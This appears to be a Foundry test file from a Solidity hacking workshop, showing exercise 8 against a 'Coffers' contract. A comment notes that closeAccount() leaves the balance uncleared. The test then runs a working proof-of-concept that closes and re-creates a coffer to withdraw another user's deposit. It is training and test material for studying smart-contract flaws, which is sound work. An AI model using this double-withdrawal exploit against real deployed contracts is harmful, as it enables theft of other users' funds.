// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Coffers} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise8_Coffers is Test {
    Coffers public coffers;

    function setUp() public {
        coffers = new Coffers();
    }

    /**
     * closeAccount() does not clear the balance in slot
     * so attacker could closeAccount() then createCoffer()
     * and for withdraw again without making any deposit second time
     * simply call closeAccount()
     */
    function test_closeAccount() public {
        address userA = vm.addr(1);
        vm.deal(address(this), 2 ether);
        vm.deal(userA, 2 ether);

        vm.startPrank(userA);
        coffers.createCoffer(1);
        coffers.deposit{value: 2 ether}(userA, 0);
        vm.stopPrank();

        coffers.createCoffer(1);
        coffers.deposit{value: 2 ether}(address(this), 0);
        coffers.closeAccount();
        require(address(this).balance == 2 ether, "invalid balance");
        coffers.createCoffer(1);
        coffers.closeAccount();
        require(address(this).balance == 4 ether, "invalid balance");
    }

    fallback() external payable {}

    receive() external payable {}
}
